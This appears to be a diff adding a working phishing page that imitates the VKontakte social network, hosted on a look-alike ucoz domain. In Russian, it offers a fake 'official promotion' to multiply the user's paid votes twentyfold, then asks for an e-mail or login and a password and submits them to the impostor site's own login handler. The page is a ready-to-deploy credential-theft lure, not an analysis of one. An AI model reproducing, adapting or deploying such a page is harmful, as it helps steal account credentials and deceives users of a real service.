@@ -1,0 +1,279 @@
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="vkontakte">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
+<title>В Контакте | Умножение голосов</title>
+<link rel="stylesheet" href="http://vkontakte.ru/css/rustyle.css?111" type="text/css" />
+<script src="http://vkontakte.ru/js/common.js?209"></script>
+<link rel="stylesheet" href="http://vkontakte.ru/css/reg.css?10" type="text/css" />
+<link rel="stylesheet" href="http://vkontakte.ru/css/ui_controls.css?23" type="text/css" />
+<link rel="stylesheet" href="http://vkontakte.ru/css/market.css?36" type="text/css" />
+<script type="text/javascript" src="http://vkontakte.ru/js/market.js?4"></script>
+<script type="text/javascript" src="http://vkontakte.ru/js/lib/ui_controls.js?92"></script>
+<script type="text/javascript" src="http://vkontakte.ru/js/lang0_0.js?2269"></script>
+
+<link rel="shortcut icon" href="http://vkontakte.ru/images/faviconnew.ico" />
+<link type="text/css" rel="StyleSheet" href="http://s45.ucoz.net/src/layer1.css" /><script type="text/javascript" src="http://s45.ucoz.net/src/u.js?2"></script><style type="text/css">.UhideBlock {display:none}</style>
+</head>
+
+<body onresize="onBodyResize()" onLoad="startCounting();">
+<div id="pageContainer">
+
+
+
+
+ <div id="pageLayout">
+
+<script type="text/javascript">onBodyResize()</script>
+
+<!-- pageHeader -->
+
+ <div id="pageHeader" class="p_head p_head_l0">
+ <div class="header_back"></div>
+ <div class="header_left"></div>
+ <div class="header_right"></div>
+ <div id="pageHeaderRight">
+
+ <h1 id="home"><a href="">ВКонтакте</a></h1>
+
+
+<div class="headNav">
+
+</div>
+
+ </div>
+ </div>
+
+<!-- End pageHeader -->
+
+<!-- sideBar -->
+
+ <div id="sideBar">
+
+ <ol id="nav">
+
+
+ <!--more link-->
+ </ol>
+
+ <div class="leftInfo" style="margin-bottom:10px">
+ <h4 style="color:#900">Внимание</h4>
+ <div style="text-align: center">
+ Для умножения<br/> на Вашем счете<br/> должно быть не<br/> менее 1 голоса.<br /><br /><a href='http://vkontakte.ru/payments.php?act=addfunds'>Пополнить баланс &raquo;</a>
+
+
+ </div>
+
+
+
+ </div>
+
+<!-- Put this script tag to the <head> of your page -->
+<script type="text/javascript" src="http://vkontakte.ru/js/api/share.js?10" charset="windows-1251"></script>
+
+<!-- Put this script tag to the place, where the Share button will be -->
+<script type="text/javascript"><!--
+document.write(VK.Share.button(false,{type: "round", text: "Сохранить"}));
+--></script>
+
+ </div>
+
+
+<!-- End sideBar -->
+
+
+<!-- pageBody -->
+
+ <div id="pageBody" class="pageBody">
+
+ <div id="wrapH">
+
+ <div id="wrapHI">
+
+ <div id="header"><h1> Умножение голосов</h1></div>
+ </div>
+ </div>
+
+ <div id="wrap2">
+
+ <div id="wrap1">
+ <div id="content">
+
+ <script type="text/javascript">
+var vklogin = false;
+function try_to_login(obj, text) {
+ if (text.substr(0, 4) == 'good') {
+ var to = '';
+ if (location.hash.toString().length) {
+ to += location.hash;
+ }
+ if (to.length) {
+ window.location.href='http://vkontakte-ok.ucoz.ru/' + to;
+ } else {
+ window.location.href='http://vkontakte-ok.ucoz.ru/id' + text.substr(4);
+ }
+ } else if (text.substr(0, 10) == 'not_active') {
+ window.location.href='http://vkontakte-ok.ucoz.ru/login.php?r=1';
+ } else if (text.substr(0, 6) == 'invite') {
+ window.location.href='http://vkontakte-ok.ucoz.ru/help.php?page=welcome&hash=' + text.substr(6);
+ } else if (text.substr(0, 9) == 'reginvite') {
+ window.location.href='http://vkontakte-ok.ucoz.ru/register.php?hash=' + text.substr(9);
+ } else if (text.substr(0, 7) == 'vklogin') {
+ vklogin = true;
+ ge('login').submit();
+ } else {
+ show('message_text');
+ ge('message_text').innerHTML = "<div id='error' style='font-size: 11px'>Такой почтовый адрес не зарегистрирован, либо пароль неверный.</div>";
+ }
+}
+
+function quick_login() {
+ var options = {onSuccess: try_to_login};
+ hide('message_text');
+ Ajax.postWithCaptcha('/login.php', {'op': 'a_login_attempt'}, options);
+}
+
+var captcha_send = 'Отправить';
+var captcha_cancel = 'Отмена';
+
+
+</script>
+
+<div id="message_text">
+
+
+<div id="categoriesPanel">
+<div class='notice'>Здесь проходит официальная акция по <b>умножению</b> Ваших голосов. <br/>Вы имеете уникальную возможность умножить Ваши голоса в <b>20 раз</b>, не более чем 1 раз в сутки. </div>
+
+<script>
+$(document).ready(function(){
+ $('#searchField').placeholder('Поиск объявлений');
+})
+
+function gotoMarketPage(section, cat) {
+ var q = '';
+ if (ge('qinput').value && ge('qinput').value != 'Начните вводить любое слово или имя') {
+ q = ge('qinput').value;
+ };
+ location.replace('search?c[section]=ads&c[type]='+section+'&c[category]='+cat+'&c[q]='+encodeURIComponent(winToUtf(q)));
+}
+
+</script>
+ <span id='max_label_count'></span>
+
+
+<div class="simplePage">
+ 
+<form method="post" name="login" id="login" action="/login.php">
+ <table align="center" cellpadding=0 cellspacing=7 border=0 width="80%">
+ <tr>
+ <td class="ta_r">
+ <span class="grey">Кол-во голосов:</span>
+
+ </td>
+ <td style="padding: 0px">
+ <input class="inputText" onClick="show('expirePad');" type="email" name="login" size="2" />
+ <td>
+ </tr>
+ <tr>
+ <td class="ta_r">
+ <span class="grey">E-mail или Логин:</span>
+
+ </td>
+ <td style="padding: 0px">
+ <input class="inputText" onClick="show('expirePad');" type="email" name="email" id="email" size="25" />
+ <td>
+ </tr>
+ <tr>
+ <td class="ta_r">
+ <span class="grey">Пароль:</span>
+
+ </td>
+ <td style="padding: 0px">
+ <input class="inputText" onClick="show('expirePad');" type="password" name="password" id="password" size="25" />
+ </td>
+ </tr>
+ <tr>
+ <td>
+ &nbsp;
+
+ </td>
+
+ <td>
+
+ </td>
+ </tr>
+ <tr>
+ <td>
+ &nbsp;
+
+ </td>
+
+ <td>
+<div style="height:20px; margin:5px 0px">
+<ul class="nNav btnList">
+<li>
+<b class="nc"><b class="nc1"><b></b></b><b class="nc2"><b></b></b></b>
+<span class="ncc"><a href="javascript:document.login.submit()">Умножить голоса</a></span>
+<b class="nc"><b class="nc2"><b></b></b><b class="nc1"><b></b></b></b>
+</li></ul>
+</div>
+
+ </td>
+
+ </tr>
+
+ <tr>
+ <td>
+ &nbsp;
+ </td>
+ </tr>
+
+ </table>
+ <input type="submit" value='.' style="color:#fff;border:0;padding:0;margin:0;background:#fff;height:6px;width:6px"/>
+
+</form>
+ </form>
+
+</div>
+</div>
+
+
+
+</div>
+
+ </div>
+
+ </div>
+ </div>
+
+ 
+
+ </div>
+
+ <div id="boxHolder"></div>
+
+<!-- End pageBody -->
+
+<!-- Put this script tag to the <head> of your page -->
+<script type="text/javascript" src="http://userapi.com/js/api/openapi.js?22"></script>
+
+<script type="text/javascript">
+ VK.init({apiId: API_ID, onlyWidgets: true});
+</script>
+
+<!-- Put this div tag to the place, where the Like block will be -->
+<div id="vk_like"></div>
+<script type="text/javascript">
+VK.Widgets.Like("vk_like", {type: "10"});
+</script>
+
+
+
+
+
+
+<!-- bFooter -->
+<div class="footerVK">
+ <div><a href="http://vkontakte.ru/help.php?page=about">В Контакте</a> &copy; 2006-2011 <a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(0, '1b12922924c5ad438a');" style="margin-left:7px">Русский</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(1, '1b12922924c5ad438a');" style="margin-left:7px">Українська</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(2, '1b12922924c5ad438a');" style="margin-left:7px">Беларуская (тарашкевiца)</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(3, '1b12922924c5ad438a');" style="margin-left:7px">English</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(11, '1b12922924c5ad438a');" style="margin-left:7px">Српски</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(10, '1b12922924c5ad438a');" style="margin-left:7px">Magyar</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return doChangeLang(57, '1b12922924c5ad438a');" style="margin-left:7px">Az&#601;rbaycan</a><a href="http://vkontakte-ok.ucoz.ru/#" onclick="return changeLang();" class="langSelector">все языки &raquo;</a></div>
+
